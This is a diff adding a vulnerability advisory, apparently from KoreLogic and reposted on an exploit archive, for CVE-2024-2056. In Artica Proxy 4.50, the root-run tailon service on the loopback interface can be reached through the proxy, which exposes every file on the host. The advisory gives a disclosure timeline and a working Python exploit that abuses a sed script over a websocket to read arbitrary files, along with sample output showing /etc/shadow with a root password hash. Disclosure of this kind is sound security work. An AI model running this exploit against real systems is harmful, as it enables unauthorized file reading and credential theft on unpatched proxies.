@@ -1,0 +1,168 @@
+id: 39423
+date: 03/06/2024
+title: Artica Proxy 4.50 Loopback Service Disclosure Vulnerability
+author: Jim Becher
+cves: CVE-2024-2056
+
+Title: Artica Proxy Loopback Services Remotely Accessible Unauthenticated
+Advisory ID: KL-001-2024-004
+Publication Date: 2024.03.05
+Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2024-004.txt
+
+
+1. Vulnerability Details
+
+      Affected Vendor: Artica
+      Affected Product: Artica Proxy
+      Affected Version: 4.50
+      Platform: Debian 10 LTS
+      CWE Classification: CWE-288: Authentication Bypass Using an
+                          Alternate Path or Channel, CWE-552: Files
+                          or Directories Accessible to External
+                          Parties
+      CVE ID: CVE-2024-2056
+
+
+2. Vulnerability Description
+
+     Services that are running and bound to the loopback
+     interface on the Artica Proxy are accessible through
+     the proxy service. In particular, the "tailon" service is
+     running as the root user, is bound to the loopback interface,
+     and is listening on TCP port 7050. Security issues associated
+     with exposing this network service are documented at
+     https://github.com/gvalkov/tailon#security. Using the tailon
+     service, the contents of any file on the Artica Proxy can be
+     viewed.
+
+
+3. Technical Description
+
+      root@artica-450:~# netstat -anop | grep LIST | egrep '127.0.|::' | awk '{ print $4 "   " $7 }'
+      127.0.0.1:57585         <PID>/(squid-1)
+      127.0.0.1:8562          <PID>/nginx:
+      127.0.0.1:884           <PID>/sshd
+      127.0.0.55:53           <PID>/dnscache
+      127.0.0.1:9143          <PID>/[authlog]
+      127.0.0.1:5432          <PID>/postgres
+      127.0.0.1:2521          <PID>/artica-smtpd
+      127.0.0.1:2874          <PID>/monit
+      127.0.0.1:19102         <PID>/[cache-tail]
+      127.0.0.1:3333          <PID>/go-shield-serv
+      127.0.0.1:389           <PID>/slapd
+      127.0.0.1:3334          <PID>/go-exec
+      127.0.0.1:7050          <PID>/tailon
+      :::4949                 <PID>/perl
+      :::9025                 <PID>/[error-page]
+
+      root@artica-450:~# ps -efww | grep tailon
+      root      2765     1  0 Nov07 ?        00:01:29 /sbin/tailon --allow-download --config /etc/tailon/config.toml 
+alias=Syslog,group=System,/var/log/syslog alias=Daemons,group=Services,/var/log/*.log 
+alias=Proxy,group=Service-Proxy,/var/log/squid/*.log alias=Nginx,group=Service-Web,/var/log/nginx/*.log
+
+
+4. Mitigation and Remediation Recommendation
+
+      No response from vendor; no remediation available.
+
+
+5. Credit
+
+      This vulnerability was discovered by Jim Becher and Jaggar
+      Henry of KoreLogic, Inc.
+
+
+6. Disclosure Timeline
+
+      2023.12.18 - KoreLogic requests vulnerability contact and
+                   secure communication method from Artica.
+      2023.12.18 - Artica Support issues automated ticket #1703011342
+                   promising follow-up from a human.
+      2024.01.10 - KoreLogic again requests vulnerability contact and
+                   secure communication method from Artica.
+      2024.01.10 - KoreLogic mail daemon receives SMTP 554 5.7.1 from
+                   mail.articatech.com with response
+                   "Client host rejected: Go Away!"
+      2024.01.11 - KoreLogic requests vulnerability contact and
+                   secure communication method via
+                   https://www.articatech.com/ 'Contact Us' web form.
+      2024.01.23 - KoreLogic requests CVE from MITRE.
+      2024.01.23 - MITRE issues automated ticket #1591692 promising
+                   follow-up from a human.
+      2024.02.01 - 30 business days have elapsed since KoreLogic
+                   attempted to contact the vendor.
+      2024.02.06 - KoreLogic requests update on CVE from MITRE.
+      2024.02.15 - KoreLogic requests update on CVE from MITRE.
+      2024.02.22 - KoreLogic reaches out to alternate CNA for
+                   CVE identifiers.
+      2024.02.26 - 45 business days have elapsed since KoreLogic
+                   attempted to contact the vendor.
+      2024.02.29 - Vulnerability details presented to AHA!
+                   (takeonme.org) by proxy.
+      2024.03.01 - AHA! issues CVE-2024-2056 to track this
+                   vulnerability.
+      2024.03.05 - KoreLogic public disclosure.
+
+
+7. Proof of Concept
+
+      $ python3 exploit.py 192.168.2.139 /etc/shadow
+      1701282189.746     35 192.168.2.99 TCP_TUNNEL/200 3496 CONNECT 0.0.0.0:7050 - HIER_DIRECT/0.0.0.0:7050 - 
+mac=\\\"e0:d5:5e:0a:d3:24\\\" category:%200%0D%0Acategory-name:%20Unknown%0D%0Aclog:%20cinfo:0-Unknown;%0D%0A 
+exterr=\\\"-|-\\\"
+root:$6$Pvb1ivrg5oo.a/om$xtRvfpBBSZgPt/fDjHzw9k9e.jxWaY.LPOqnqHJcSBuQMxtjtG6pBBMMf1Z6D4jtN6kDSB3h5FufJ9DuXv.7R0:19507:0:99999:7:::
+      daemon:*:19507:0:99999:7:::
+      bin:*:19507:0:99999:7:::
+      sys:*:19507:0:99999:7:::
+      sync:*:19507:0:99999:7:::
+      games:*:19507:0:99999:7:::
+      man:*:19507:0:99999:7:::
+      ...
+      ...
+
+
+      ### exploit.py
+
+      import re
+      import sys
+      import json
+      import websocket
+
+      """
+      run `pip install websocket-client` before executing.
+      """
+
+      ARTICA_PROXY_IP = sys.argv[1] if len(sys.argv) >= 2 else '172.17.0.1'
+      FILE_TO_READ    = sys.argv[2] if len(sys.argv) >= 3 else '/etc/passwd'
+      WEBSOCKET_URI   = 'ws://0.0.0.0:7050/tailon/ws/1337/korelogic/websocket'
+
+      payload = {
+          'command': 'sed',
+          'script':  f'r {FILE_TO_READ}',
+          'entry': {
+              'path':   '/var/log/squid/access.log',
+              'alias':  'Proxy/access.log',
+          },
+          'nlines': 1
+      }
+
+      websocket_message = json.dumps([json.dumps(payload)])
+
+      ws = websocket.WebSocket()
+      ws.connect(WEBSOCKET_URI, http_proxy_host=ARTICA_PROXY_IP, http_proxy_port='8085', proxy_type='http')
+      ws.send(websocket_message)
+
+      reading = True
+      while reading:
+          data = re.search(r'a\["\[\\"o\\",\\"(.*)\\"]"]$', ws.recv())
+          if data: print(data.group(1))
+
+      ws.close()
+
+
+The contents of this advisory are copyright(c) 2024
+KoreLogic, Inc. and are licensed under a Creative Commons
+Attribution Share-Alike 4.0 (United States) License:
+http://creativecommons.org/licenses/by-sa/4.0/
+
+#  0day.today [2024-03-15]  #
